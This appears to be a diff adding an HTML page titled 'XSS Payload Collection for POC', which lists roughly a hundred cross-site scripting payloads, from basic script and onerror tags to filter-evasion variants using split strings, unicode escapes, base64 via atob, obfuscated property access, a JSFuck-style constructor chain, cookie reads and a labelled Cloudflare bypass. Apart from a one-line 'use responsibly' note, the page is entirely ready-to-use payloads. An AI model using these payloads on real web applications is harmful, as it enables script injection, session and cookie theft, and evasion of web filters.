@@ -1,1 +1,124 @@
-<script>alert(1337);</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simple XSS Payload Blog</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        h1 { text-align: center; }
+        pre { background: #f4f4f4; padding: 10px; border: 1px solid #ddd; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <h1>XSS Payload Collection for POC</h1>
+    <p>This is a simple HTML blog page containing examples of simple and advanced XSS payloads. These are for proof-of-concept demonstration of a bug I found. Use responsibly.</p>
+    
+    <h2>Simple XSS Payloads</h2>
+    <pre>&lt;script&gt;alert(1)&lt;/script&gt;</pre>
+    <pre>&lt;img src="x" onerror="alert(1)"&gt;</pre>
+    <pre>&lt;svg onload="alert(1)"&gt;&lt;/svg&gt;</pre>
+    
+    <h2>Advanced XSS Payloads</h2>
+    <pre>"&gt;&lt;/textarea&gt;&lt;Img Src=OnXSS OnError=prompt(1)&gt;</pre>
+    <pre>&lt;x&gt;xxx&lt;!--&gt;&lt;!&gt;+&gt;+&gt;&lt;/Script+xxx&gt;&lt;script%20x&gt;window/*xxx*/['al'%2b'ert'](1);//&lt;/script%20x&gt;&lt;/x&gt;&lt;x&gt;xxx&lt;!--&gt;&lt;!&gt;+&gt;+&gt;</pre>
+    <pre>'"&gt;&lt;/textarea&gt;&lt;Svg On Only=1 OnLoad=prompt(1)&gt;</pre>
+    <pre>'-eval(window/*xxx*/['al' + 'ert'](document/*xxx*/['coo' + 'kie'])-'</pre>
+    <pre>'-eval(window/*---*/['al'/*xxx*/+'ert'](document['coo'/*trick*/+'kie'])-'</pre>
+    <pre>"-eval(window/*xxx*/['al' + 'ert'](document/*xxx*/['coo' + 'kie'])-"</pre>
+    <pre>"-eval(window/*---*/['al'/*xxx*/+'ert'](document['coo'/*trick*/+'kie'])-"</pre>
+    <pre>'window/*xxx*/['al' + 'ert'](document/*xxx*/['coo' + 'kie']);'</pre>
+    <pre>'window/*---*/['al'/*xxx*/+'ert'](document['coo'/*trick*/+'kie']);'</pre>
+    <pre>"window/*xxx*/['al' + 'ert'](document/*xxx*/['coo' + 'kie']);"</pre>
+    <pre>"window/*---*/['al'/*xxx*/+'ert'](document['coo'/*trick*/+'kie']);"</pre>
+    <pre>'-confirm(1)-'</pre>
+    <pre>"-ConFirM(1)-"</pre>
+    <pre>'-eval("window['conf'%2B'irm'](1)")-'</pre>
+    <pre>"-eval("window['conf'%2B'irm'](1)")-"</pre>
+    <pre>" AutoFocus OnFocus=confirm(1)// tabindex=1&gt; x="" /&gt;</pre>
+    <pre>&lt;/script&gt;&lt;svg&gt;"-confirm(1)//</pre>
+    <pre>'"\x3e\x3csVg/&lt;sVg/oNloAd=prompt(1)//&gt;\x3e&gt;</pre>
+    <pre>--&gt;""/&gt;XXX&lt;/script&gt;&lt;deTailS open x="&gt;" ontoggle=(co\u006efirm)`1`&gt;</pre>
+    <pre>'"&gt;&lt;Body OnLoad=confirm(1)&gt;</pre>
+    <pre>'"&gt;&lt;body/oNpagEshoW=(confirm)(1)&gt;</pre>
+    <pre>'"&gt;&lt;body onpageshow="confirm(1)"&gt;</pre>
+    <pre>"&gt;&lt;img src=x onerror=alert&amp;#401&amp;#41&gt;</pre>
+    <pre>'"&gt;&lt;Details Open OnToggle=confirm(1)&gt;</pre>
+    <pre>');&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</pre>
+    <pre>'"&gt;&lt;Iframe Src=JaVaScRiPt:confirm(1)&gt;</pre>
+    <pre>'"&gt;&lt;Embed Src="JavaScript:confirm(1)"&gt;</pre>
+    <pre>'"&gt;&lt;Object Data=JaVaScRiPt:confirm(1)&gt;</pre>
+    <pre>'"&gt;&lt;iframe/src \/\/onload = confirm(1)&gt;</pre>
+    <pre>'"&gt;&lt;Video&gt;&lt;Source OnError="confirm(1)"&gt;</pre>
+    <pre>"&gt;&lt;sc&gt;&lt;img/src/onerror=.1|alert`1`&gt;&lt;/sc&gt;</pre>
+    <pre>&lt;svg/onload%E2%80%8B=alert/&amp;#42;&amp;#42;/(1)&gt;</pre>
+    <pre>'"&gt;&lt;TextArea AutoFocus OnFocus=confirm(1)&gt;</pre>
+    <pre>'"&gt;&lt;Audio Src=OnXSS OnLoadStart=confirm(1)&gt;</pre>
+    <pre>'"&gt;&lt;!--&gt;&lt;iMg sRc=x oNerror=confirm`XSS`&gt;&lt;!--</pre>
+    <pre>&lt;/h1&gt;&lt;Svg Only=1 OnLoad=confirm(atob("MQ=="))&gt;</pre>
+    <pre>"&gt;&lt;img+src%3Dx+onerror%3Djavascript%3Aalert(1)&gt;</pre>
+    <pre>'"&gt;&lt;IFRAME SRC="javascript:confirm(1);"&gt;&lt;/IFRAME&gt;</pre>
+    <pre>'"&gt;&lt;Input AutoFocus OnFocus=confirm(1) tabindex=1&gt;</pre>
+    <pre>'"&gt;&lt;Image Src=1 Href=1 OnError="confirm(1)"&gt;&lt;/image&gt;</pre>
+    <pre>"&lt;!--&gt;&lt;Svg+OnLoad%3dconfirm%3f.(%2fcypher%2f)&lt;!--1")</pre>
+    <pre>'"&gt;&lt;img src="X" onerror=top[8680439..toString(30)](1)&gt;</pre>
+    <pre>ddd");&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;script&gt;aaa("</pre>
+    <pre>&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=confirm(1)&gt;"&gt;</pre>
+    <pre>'"&gt;&lt;input autofocus onfocus =top[(584390752*16).toString(32-1*2)](/1/)&gt;</pre>
+    <pre>javascript:const originx="1",var{a:onerror}={a:%2561lert};throw originx</pre>
+    <pre>"&gt;&gt;&gt;&gt;&gt;&gt;&lt;marquee&gt;RXSS&lt;/marquee&gt;&lt;/head&gt;&lt;abc%3E&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;meta</pre>
+    <pre>"&gt;"&gt;&lt;Svg+Only%3D1+OnLoad%3Dconfirm%28atob%28"Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ%3D%3D"%29%29&gt;</pre>
+    <pre>&lt;/textarea&gt;a00n&lt;details open="\u0022x="ontoggle="x=atob;z=x('MQ==');a00n=top;n=`ev`;a00n[n+'al'](z)"&gt;</pre>
+    <pre>&lt;noscript&gt;&lt;p title="&lt;/noscript&gt;&lt;img src=x onerror=([,O,B,J,E,C,,]=[]+{},[T,R,U,E,F,A,L,S,,,N]=[!!O]+!O+B.E)[X=C+O+N+S+T+R+U+C+T+O+R][X](A+L+E+R+T+(1))()&gt;"&gt;</pre>
+    <pre>javascript:alert(1)</pre>
+    <pre>&lt;&gt;javascript:alert(1);</pre>
+    <pre>javascript://%0aalert(1)</pre>
+    <pre>");javascript:alert(1);//</pre>
+    <pre>'%09);%0A%09%09javascript:alert(1)//</pre>
+    <pre>"*ConFirM(1)*"</pre>
+    <pre>\'-confirm(1)//</pre>
+    <pre>';confirm(1)//</pre>
+    <pre>";a=prompt,a(1)//</pre>
+    <pre>--!&gt;&lt;Svg/Onload=confirm`1`&gt;</pre>
+    <pre>ONXss=&gt;&lt;svg/ONLoad=confirm(1)+x</pre>
+    <pre>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</pre>
+    <pre>OnXSS=&lt;Img/Src/OnError=confirm(1)&gt;</pre>
+    <pre>"Onx=() AutOfOcUs OnfOCuS=prompt(1)&gt;</pre>
+    <pre>1')"&lt;!--&gt;&lt;Svg OnLoad=(confirm)(1)&lt;!--</pre>
+    <pre>'"&gt;&lt;svg%20oNinad=1%20onload=alert(1)&gt;</pre>
+    <pre>'"&gt;&lt;svg onfake="1" onload="confirm(1)"&gt;</pre>
+    <pre>ONxss=&gt;&lt;details open ontoggle=prompt(1)+x</pre>
+    <pre>'"/&gt;&lt;svg+svg+svg\/\/On+OnLoAd=confirm(1)&gt;</pre>
+    <pre>'"&gt;&lt;svg&gt;&lt;animate onbegin=confirm(1)&gt;&lt;/svg&gt;</pre>
+    <pre>'"&gt;confirm(1)&lt;/script&gt;&lt;script/154=';;;;;;;</pre>
+    <pre>'"&gt;&lt;embed src="data:text/html;base64,MQ=="&gt;</pre>
+    <pre>'"&gt;&lt;video onloadstart=confirm(1)&gt;&lt;source&gt;&lt;/*&gt;</pre>
+    <pre>'"&gt;&lt;object data="data:text/html;base64, MQ=="&gt;</pre>
+    <pre>'"&gt;&lt;Embed Src="about:blank" OnLoad="confirm(1)"&gt;</pre>
+    <pre>'"&gt;&lt;sVg/onfake="x=y"oNload=;1^(co\u006efirm)`1`^1//</pre>
+    <pre>'"&gt;&lt;img src=x onerrora=confirm() onerror=confirm(1)&gt;</pre>
+    <pre>'"&gt;&lt;iframe src="data:text/html;base64,MQ=="&gt;&lt;/iframe&gt;</pre>
+    <pre>'"&gt;&lt;dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a(1)%20x&gt;</pre>
+    <pre>http://example.com"",})&lt;/script&gt;&lt;svg+onload=confirm(1)&gt;</pre>
+    <pre>'"&lt;details open ontoggle="(()=&gt;confirm`1`)()"&gt;&lt;/details&gt;</pre>
+    <pre>'";&lt;/script&gt;&lt;script&gt;prompt(1);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;&lt;!--</pre>
+    <pre>%0D%0A%0D%0A%3Cbody+x=%27&amp;%27onload=%22(confirm)(1)%22%3E</pre>
+    <pre>'"&gt;&lt;Iframe Src="about:blank" OnLoad="confirm(1)"&gt;&lt;/iframe&gt;</pre>
+    <pre>'"&gt;&lt;audio onerror=prompt(1) src="nonexistent.mp3"&gt;&lt;/audio&gt;</pre>
+    <pre>'"&gt;&lt;object data='data:text/html;;;;;base64,MQ=='&gt;&lt;/object&gt;</pre>
+    <pre>'"&gt;&lt;Object Data="about:blank" OnLoad="confirm(1)"&gt;&lt;/object&gt;</pre>
+    <pre>"OnFocus=confirm&amp;#x00000000028;1&amp;#x00000000029; AutoFocus="</pre>
+    <pre>&lt;input/autofocus/onfocus=setTimeout(URL.slice(-7))//#confirm(1)</pre>
+    <pre>'"&gt;&lt;video controls src=1 onfocus=confirm(1) autofocus tabindex=1&gt; x="" /&gt;</pre>
+    <pre>'"&gt;&lt;select autofocus onfocus=confirm(1) tabindex=1&gt;&lt;option&gt;Item&lt;/option&gt;&lt;/select&gt;</pre>
+    <pre>'"/&gt;&lt;/textarea&gt;&lt;svg&gt;&lt;foreignObject&gt;&lt;input autofocus onfocus=prompt(1) tabindex=1&gt; x="" /&gt;</pre>
+    <pre>ONset=&gt;&lt;details open/ONtoggle=+prompt%26%23x60%3B%26%23x5b%3B1%26%23x5d%3B%26%23x60%3B+</pre>
+    <pre>'"&gt;&lt;details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc(`1`%26%2300000000000000000041//</pre>
+    <pre>'"&gt;&lt;details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle=&amp;#x0000000000061;lert&amp;#x000000028;1&amp;#x000029;&gt;</pre>
+    <pre>--&gt;""/&gt;XXX&lt;/script&gt;&lt;svG open x="&gt;" OnLoad=(co\u006efirm)`1`&gt;</pre>
+    <pre>--&gt;""/&gt;XXX&lt;/script&gt;&lt;bodY open x="&gt;" OnLoad=(co\u006efirm)`1`&gt;</pre>
+    <pre>--&gt;""/&gt;XXX&lt;/script&gt;&lt;iframE open x="&gt;" OnLoad=(co\u006efirm)`1`&gt;</pre>
+    <pre>--&gt;""/&gt;XXX&lt;/script&gt;&lt;imG Src=OnXXX open x="&gt;" OnError=(co\u006efirm)`1`&gt;</pre>
+    <pre>--&gt;""/&gt;XXX&lt;/script&gt;&lt;imagE Src=1 href=1 open x="&gt;" OnError=(co\u006efirm)`1`&gt;&lt;/image&gt;</pre>
+</body>
+</html>
